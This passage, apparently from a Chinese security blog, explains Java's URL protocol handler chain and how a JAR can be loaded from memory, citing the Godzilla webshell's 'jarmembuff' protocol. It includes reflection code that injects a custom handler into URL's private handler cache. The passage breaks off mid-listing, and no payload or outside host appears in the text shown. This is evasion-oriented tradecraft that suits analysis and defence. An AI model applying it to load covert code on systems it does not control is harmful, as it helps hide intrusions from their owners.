+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716144135-94fe472d-bd6b-4300-9f58-3d869e9d8e36.png#averageHue=%23faf9f9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=717&amp;id=u1724cb75&amp;originHeight=1434&amp;originWidth=2176&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1393027&amp;status=done&amp;style=none&amp;taskId=ua85e48ba-578a-4792-a6eb-69a1777de52&amp;title=&amp;width=1088"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716144135-94fe472d-bd6b-4300-9f58-3d869e9d8e36.png#averageHue=%23faf9f9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=717&amp;id=u1724cb75&amp;originHeight=1434&amp;originWidth=2176&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1393027&amp;status=done&amp;style=none&amp;taskId=ua85e48ba-578a-4792-a6eb-69a1777de52&amp;title=&amp;width=1088, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716144135-94fe472d-bd6b-4300-9f58-3d869e9d8e36.png#averageHue=%23faf9f9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=717&amp;id=u1724cb75&amp;originHeight=1434&amp;originWidth=2176&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1393027&amp;status=done&amp;style=none&amp;taskId=ua85e48ba-578a-4792-a6eb-69a1777de52&amp;title=&amp;width=1088 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695716144135-94fe472d-bd6b-4300-9f58-3d869e9d8e36.png#averageHue=%23faf9f9&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=717&amp;id=u1724cb75&amp;originHeight=1434&amp;originWidth=2176&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=1393027&amp;status=done&amp;style=none&amp;taskId=ua85e48ba-578a-4792-a6eb-69a1777de52&amp;title=&amp;width=1088 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+其实这里的协议是可以构造的，例如我们可以设置一种abc://127.0.0.1/exp.jar，就会识别为abc协议
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892142236-144ea13d-e26c-42a1-941b-3978ece796fe.png#averageHue=%23fcfbfb&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=341&amp;id=XsuBH&amp;originHeight=682&amp;originWidth=1582&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=491630&amp;status=done&amp;style=none&amp;taskId=u4bfa2aa6-b904-48fc-9dd5-d65b50c375e&amp;title=&amp;width=791" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892142236-144ea13d-e26c-42a1-941b-3978ece796fe.png#averageHue=%23fcfbfb&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=341&amp;id=XsuBH&amp;originHeight=682&amp;originWidth=1582&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=491630&amp;status=done&amp;style=none&amp;taskId=u4bfa2aa6-b904-48fc-9dd5-d65b50c375e&amp;title=&amp;width=791">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892142236-144ea13d-e26c-42a1-941b-3978ece796fe.png#averageHue=%23fcfbfb&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=341&amp;id=XsuBH&amp;originHeight=682&amp;originWidth=1582&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=491630&amp;status=done&amp;style=none&amp;taskId=u4bfa2aa6-b904-48fc-9dd5-d65b50c375e&amp;title=&amp;width=791"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892142236-144ea13d-e26c-42a1-941b-3978ece796fe.png#averageHue=%23fcfbfb&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=341&amp;id=XsuBH&amp;originHeight=682&amp;originWidth=1582&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=491630&amp;status=done&amp;style=none&amp;taskId=u4bfa2aa6-b904-48fc-9dd5-d65b50c375e&amp;title=&amp;width=791, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892142236-144ea13d-e26c-42a1-941b-3978ece796fe.png#averageHue=%23fcfbfb&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=341&amp;id=XsuBH&amp;originHeight=682&amp;originWidth=1582&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=491630&amp;status=done&amp;style=none&amp;taskId=u4bfa2aa6-b904-48fc-9dd5-d65b50c375e&amp;title=&amp;width=791 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892142236-144ea13d-e26c-42a1-941b-3978ece796fe.png#averageHue=%23fcfbfb&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=341&amp;id=XsuBH&amp;originHeight=682&amp;originWidth=1582&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=491630&amp;status=done&amp;style=none&amp;taskId=u4bfa2aa6-b904-48fc-9dd5-d65b50c375e&amp;title=&amp;width=791 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+然后在java.net.URL#getURLStreamHandler判断如果handlers里没有缓存，就会尝试去寻找sun.net.www.protocol.abc.Handler这个类，这里handlers属性是一个重点。
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892285685-e7435d10-e8af-49ea-955d-1acd93935378.png#averageHue=%23f8f8f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=340&amp;id=ZTKDC&amp;originHeight=680&amp;originWidth=1368&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=497182&amp;status=done&amp;style=none&amp;taskId=u6d16c17b-0f72-4cc2-9828-fc2680acd1d&amp;title=&amp;width=684" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892285685-e7435d10-e8af-49ea-955d-1acd93935378.png#averageHue=%23f8f8f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=340&amp;id=ZTKDC&amp;originHeight=680&amp;originWidth=1368&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=497182&amp;status=done&amp;style=none&amp;taskId=u6d16c17b-0f72-4cc2-9828-fc2680acd1d&amp;title=&amp;width=684">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892285685-e7435d10-e8af-49ea-955d-1acd93935378.png#averageHue=%23f8f8f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=340&amp;id=ZTKDC&amp;originHeight=680&amp;originWidth=1368&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=497182&amp;status=done&amp;style=none&amp;taskId=u6d16c17b-0f72-4cc2-9828-fc2680acd1d&amp;title=&amp;width=684"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892285685-e7435d10-e8af-49ea-955d-1acd93935378.png#averageHue=%23f8f8f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=340&amp;id=ZTKDC&amp;originHeight=680&amp;originWidth=1368&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=497182&amp;status=done&amp;style=none&amp;taskId=u6d16c17b-0f72-4cc2-9828-fc2680acd1d&amp;title=&amp;width=684, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892285685-e7435d10-e8af-49ea-955d-1acd93935378.png#averageHue=%23f8f8f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=340&amp;id=ZTKDC&amp;originHeight=680&amp;originWidth=1368&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=497182&amp;status=done&amp;style=none&amp;taskId=u6d16c17b-0f72-4cc2-9828-fc2680acd1d&amp;title=&amp;width=684 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892285685-e7435d10-e8af-49ea-955d-1acd93935378.png#averageHue=%23f8f8f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=340&amp;id=ZTKDC&amp;originHeight=680&amp;originWidth=1368&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=497182&amp;status=done&amp;style=none&amp;taskId=u6d16c17b-0f72-4cc2-9828-fc2680acd1d&amp;title=&amp;width=684 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892230380-bd045b94-439b-4184-b8b1-b762e3eaefdc.png#averageHue=%23faf9f8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=449&amp;id=DdUp1&amp;originHeight=898&amp;originWidth=1942&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=835161&amp;status=done&amp;style=none&amp;taskId=uea714707-297e-4f61-a1ca-738e0a44eb6&amp;title=&amp;width=971" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892230380-bd045b94-439b-4184-b8b1-b762e3eaefdc.png#averageHue=%23faf9f8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=449&amp;id=DdUp1&amp;originHeight=898&amp;originWidth=1942&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=835161&amp;status=done&amp;style=none&amp;taskId=uea714707-297e-4f61-a1ca-738e0a44eb6&amp;title=&amp;width=971">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892230380-bd045b94-439b-4184-b8b1-b762e3eaefdc.png#averageHue=%23faf9f8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=449&amp;id=DdUp1&amp;originHeight=898&amp;originWidth=1942&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=835161&amp;status=done&amp;style=none&amp;taskId=uea714707-297e-4f61-a1ca-738e0a44eb6&amp;title=&amp;width=971"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892230380-bd045b94-439b-4184-b8b1-b762e3eaefdc.png#averageHue=%23faf9f8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=449&amp;id=DdUp1&amp;originHeight=898&amp;originWidth=1942&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=835161&amp;status=done&amp;style=none&amp;taskId=uea714707-297e-4f61-a1ca-738e0a44eb6&amp;title=&amp;width=971, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892230380-bd045b94-439b-4184-b8b1-b762e3eaefdc.png#averageHue=%23faf9f8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=449&amp;id=DdUp1&amp;originHeight=898&amp;originWidth=1942&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=835161&amp;status=done&amp;style=none&amp;taskId=uea714707-297e-4f61-a1ca-738e0a44eb6&amp;title=&amp;width=971 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892230380-bd045b94-439b-4184-b8b1-b762e3eaefdc.png#averageHue=%23faf9f8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=449&amp;id=DdUp1&amp;originHeight=898&amp;originWidth=1942&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=835161&amp;status=done&amp;style=none&amp;taskId=uea714707-297e-4f61-a1ca-738e0a44eb6&amp;title=&amp;width=971 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>除了sun.net.www.protocol.http.Handler以外，默认的JDK还支持以下协议，可以看看：
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892470067-0eee7d21-0eb7-4fb5-89a8-56959355f096.png#averageHue=%23fcfce4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=541&amp;id=psofe&amp;originHeight=1082&amp;originWidth=686&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=376833&amp;status=done&amp;style=none&amp;taskId=u46295c04-fa45-4966-95b0-860f892a080&amp;title=&amp;width=343" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892470067-0eee7d21-0eb7-4fb5-89a8-56959355f096.png#averageHue=%23fcfce4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=541&amp;id=psofe&amp;originHeight=1082&amp;originWidth=686&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=376833&amp;status=done&amp;style=none&amp;taskId=u46295c04-fa45-4966-95b0-860f892a080&amp;title=&amp;width=343">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892470067-0eee7d21-0eb7-4fb5-89a8-56959355f096.png#averageHue=%23fcfce4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=541&amp;id=psofe&amp;originHeight=1082&amp;originWidth=686&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=376833&amp;status=done&amp;style=none&amp;taskId=u46295c04-fa45-4966-95b0-860f892a080&amp;title=&amp;width=343"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892470067-0eee7d21-0eb7-4fb5-89a8-56959355f096.png#averageHue=%23fcfce4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=541&amp;id=psofe&amp;originHeight=1082&amp;originWidth=686&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=376833&amp;status=done&amp;style=none&amp;taskId=u46295c04-fa45-4966-95b0-860f892a080&amp;title=&amp;width=343, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892470067-0eee7d21-0eb7-4fb5-89a8-56959355f096.png#averageHue=%23fcfce4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=541&amp;id=psofe&amp;originHeight=1082&amp;originWidth=686&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=376833&amp;status=done&amp;style=none&amp;taskId=u46295c04-fa45-4966-95b0-860f892a080&amp;title=&amp;width=343 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695892470067-0eee7d21-0eb7-4fb5-89a8-56959355f096.png#averageHue=%23fcfce4&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=541&amp;id=psofe&amp;originHeight=1082&amp;originWidth=686&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=376833&amp;status=done&amp;style=none&amp;taskId=u46295c04-fa45-4966-95b0-860f892a080&amp;title=&amp;width=343 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>后续就会依次经过以下步骤，
+java.net.URL#openConnection
+java.net.URL#openStream
+sun.misc.URLClassPath.JarLoader#getJarFile(java.net.URL)
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695718661502-ba5b12b5-a099-4e87-857d-15f03961d056.png#averageHue=%23f8f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=565&amp;id=u68fa22a9&amp;originHeight=1130&amp;originWidth=1454&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=784357&amp;status=done&amp;style=none&amp;taskId=u9dc0205a-2b70-46bf-bf61-2bfd29b4cc6&amp;title=&amp;width=727" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695718661502-ba5b12b5-a099-4e87-857d-15f03961d056.png#averageHue=%23f8f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=565&amp;id=u68fa22a9&amp;originHeight=1130&amp;originWidth=1454&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=784357&amp;status=done&amp;style=none&amp;taskId=u9dc0205a-2b70-46bf-bf61-2bfd29b4cc6&amp;title=&amp;width=727">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695718661502-ba5b12b5-a099-4e87-857d-15f03961d056.png#averageHue=%23f8f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=565&amp;id=u68fa22a9&amp;originHeight=1130&amp;originWidth=1454&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=784357&amp;status=done&amp;style=none&amp;taskId=u9dc0205a-2b70-46bf-bf61-2bfd29b4cc6&amp;title=&amp;width=727"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1695718661502-ba5b12b5-a099-4e87-857d-15f03961d056.png#averageHue=%23f8f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=565&amp;id=u68fa22a9&amp;originHeight=1130&amp;originWidth=1454&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=784357&amp;status=done&amp;style=none&amp;taskId=u9dc0205a-2b70-46bf-bf61-2bfd29b4cc6&amp;title=&amp;width=727, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695718661502-ba5b12b5-a099-4e87-857d-15f03961d056.png#averageHue=%23f8f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=565&amp;id=u68fa22a9&amp;originHeight=1130&amp;originWidth=1454&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=784357&amp;status=done&amp;style=none&amp;taskId=u9dc0205a-2b70-46bf-bf61-2bfd29b4cc6&amp;title=&amp;width=727 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1695718661502-ba5b12b5-a099-4e87-857d-15f03961d056.png#averageHue=%23f8f7f6&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=565&amp;id=u68fa22a9&amp;originHeight=1130&amp;originWidth=1454&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=784357&amp;status=done&amp;style=none&amp;taskId=u9dc0205a-2b70-46bf-bf61-2bfd29b4cc6&amp;title=&amp;width=727 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure>
+在sun.net.www.protocol.http.Handler#openConnection(java.net.URL, java.net.Proxy)中会返回一个新的HttpURLConnection对象，该对象主要负责具体对远程地址的请求，获取Jar的内容。
+<figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696666632054-61766db3-d565-4f81-a36a-b9138027598d.png#averageHue=%23fcfbf8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=119&amp;id=u8aed1086&amp;originHeight=149&amp;originWidth=862&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=17473&amp;status=done&amp;style=none&amp;taskId=uf6bb3fac-2ac2-4dcd-9205-951c5d89570&amp;title=&amp;width=689.6" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696666632054-61766db3-d565-4f81-a36a-b9138027598d.png#averageHue=%23fcfbf8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=119&amp;id=u8aed1086&amp;originHeight=149&amp;originWidth=862&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=17473&amp;status=done&amp;style=none&amp;taskId=uf6bb3fac-2ac2-4dcd-9205-951c5d89570&amp;title=&amp;width=689.6">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696666632054-61766db3-d565-4f81-a36a-b9138027598d.png#averageHue=%23fcfbf8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=119&amp;id=u8aed1086&amp;originHeight=149&amp;originWidth=862&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=17473&amp;status=done&amp;style=none&amp;taskId=uf6bb3fac-2ac2-4dcd-9205-951c5d89570&amp;title=&amp;width=689.6"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1696666632054-61766db3-d565-4f81-a36a-b9138027598d.png#averageHue=%23fcfbf8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=119&amp;id=u8aed1086&amp;originHeight=149&amp;originWidth=862&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=17473&amp;status=done&amp;style=none&amp;taskId=uf6bb3fac-2ac2-4dcd-9205-951c5d89570&amp;title=&amp;width=689.6, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696666632054-61766db3-d565-4f81-a36a-b9138027598d.png#averageHue=%23fcfbf8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=119&amp;id=u8aed1086&amp;originHeight=149&amp;originWidth=862&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=17473&amp;status=done&amp;style=none&amp;taskId=uf6bb3fac-2ac2-4dcd-9205-951c5d89570&amp;title=&amp;width=689.6 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1696666632054-61766db3-d565-4f81-a36a-b9138027598d.png#averageHue=%23fcfbf8&amp;clientId=ud0545662-3e42-4&amp;from=paste&amp;height=119&amp;id=u8aed1086&amp;originHeight=149&amp;originWidth=862&amp;originalType=binary&amp;ratio=2&amp;rotation=0&amp;showTitle=false&amp;size=17473&amp;status=done&amp;style=none&amp;taskId=uf6bb3fac-2ac2-4dcd-9205-951c5d89570&amp;title=&amp;width=689.6 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>可以看到在http协议加载Jar过程中有两个重要的类：</p>
+<ul>
+<li>sun.net.www.protocol.http.HttpURLConnection</li>
+<li>sun.net.www.protocol.http.Handler</li>
+</ul>
+<p>这两个类都与HTTP协议相关，在Java中用于处理HTTP连接和请求：</p>
+<ul>
+<li>sun.net.www.protocol.http.HttpURLConnection类是Java标准库中的一个类，它继承自java.net.HttpURLConnection类，用于创建HTTP连接并发送HTTP请求。它提供了一组方法来设置请求的参数、发送请求、获取响应等操作，使开发者可以通过该类与远程服务器进行HTTP通信。</li>
+<li>sun.net.www.protocol.http.Handler类是Java虚拟机（JVM）中的一个实现类，它实现了java.net.URLStreamHandler接口。URLStreamHandler接口定义了处理不同URL协议的方法，而sun.net.www.protocol.http.Handler类具体处理HTTP协议。它负责解析并处理URL对象中的HTTP部分，包括建立HTTP连接、发送HTTP请求等操作，这些操作实际是由HttpURLConnection来实现。</li>
+</ul>
+<p>这两个类是获取Jar包内容的核心所在，想要实现内存加载Jar的关键部分就在这里。</p>
+<h2 id="内存加载jar原理" class="headerLink">
+    <a href="#%e5%86%85%e5%ad%98%e5%8a%a0%e8%bd%bdjar%e5%8e%9f%e7%90%86" class="header-mark"></a>5 内存加载Jar原理</h2><p>综合看下来，最简单的办法就是实现一套自定义一套协议，在http协议的基础上修改获取Jar的逻辑，这也是beichen师傅的做法</p>
+<h3 id="增加自定义protocol" class="headerLink">
+    <a href="#%e5%a2%9e%e5%8a%a0%e8%87%aa%e5%ae%9a%e4%b9%89protocol" class="header-mark"></a>5.1 增加自定义protocol</h3><p>在哥斯拉中叫jarmembuff，在这里我们直接把协议跟对应的handler塞到URL对象的handlers缓存中，核心代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Field declaredField = null;
+</span></span><span class="line"><span class="cl">files = new ArrayList();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">try {
+</span></span><span class="line"><span class="cl">    declaredField = URL.class.getDeclaredField(&#34;handlers&#34;);
+</span></span><span class="line"><span class="cl">} catch (NoSuchFieldException var7) {
+</span></span><span class="line"><span class="cl">    try {
+</span></span><span class="line"><span class="cl">        declaredField = URL.class.getDeclaredField(&#34;ph_cache&#34;);
+</span></span><span class="line"><span class="cl">    } catch (NoSuchFieldException var5) {
+</span></span><span class="line"><span class="cl">    } catch (Exception var6) {
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">declaredField.setAccessible(true);
+</span></span><span class="line"><span class="cl">Map map = (Map) declaredField.get(null);
+</span></span><span class="line"><span class="cl">synchronized (map) {
+</span></span><span class="line"><span class="cl">    Object memoryBufferURLStreamHandler;
+</span></span><span class="line"><span class="cl">    if (map.containsKey(&#34;jarmembuff&#34;)) {
+</span></span><span class="line"><span class="cl">        memoryBufferURLStreamHandler = map.get(&#34;jarmembuff&#34;);
+</span></span><span class="line"><span class="cl">    } else {
+</span></span><span class="line"><span class="cl">        memoryBufferURLStreamHandler = new MemoryBufferURLStreamHandler();
+</span></span><span class="line"><span class="cl">        map.put(&#34;jarmembuff&#34;, memoryBufferURLStreamHandler);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    files = (List) memoryBufferURLStreamHandler.getClass().getMethod(&#34;getFiles&#34;).invoke(memoryBufferURLStreamHandler);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="实现自定义urlstreamhandler" class="headerLink">
+    <a href="#%e5%ae%9e%e7%8e%b0%e8%87%aa%e5%ae%9a%e4%b9%89urlstreamhandler" class="header-mark"></a>5.2 实现自定义URLStreamHandler</h3><p>MemoryBufferURLStreamHandler中openConnection直接返回自定义的URLConnection类，用于获取Jar的内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import java.io.IOException;
+</span></span><span class="line"><span class="cl">import java.net.URL;
+</span></span><span class="line"><span class="cl">import java.net.URLConnection;
+</span></span><span class="line"><span class="cl">import java.net.URLStreamHandler;
+</span></span><span class="line"><span class="cl">import java.util.ArrayList;
+</span></span><span class="line"><span class="cl">import java.util.List;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class MemoryBufferURLStreamHandler extends URLStreamHandler {
+</span></span><span class="line"><span class="cl">    private final List files = new ArrayList();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public MemoryBufferURLStreamHandler() {
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public List getFiles() {
+</span></span><span class="line"><span class="cl">        return this.files;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public URLConnection openConnection(URL url) throws IOException {
+</span></span><span class="line"><span class="cl">        return new MemoryBufferURLConnection(url);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="实现自定义urlconnection" class="headerLink">
+    <a href="#%e5%ae%9e%e7%8e%b0%e8%87%aa%e5%ae%9a%e4%b9%89urlconnection" class="header-mark"></a>5.3 实现自定义URLConnection</h3><p>MemoryBufferURLConnection，在getInputStream方法中直接返回要加载Jar包的byte数组，该数组内容可以自定义传入，即内存加载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
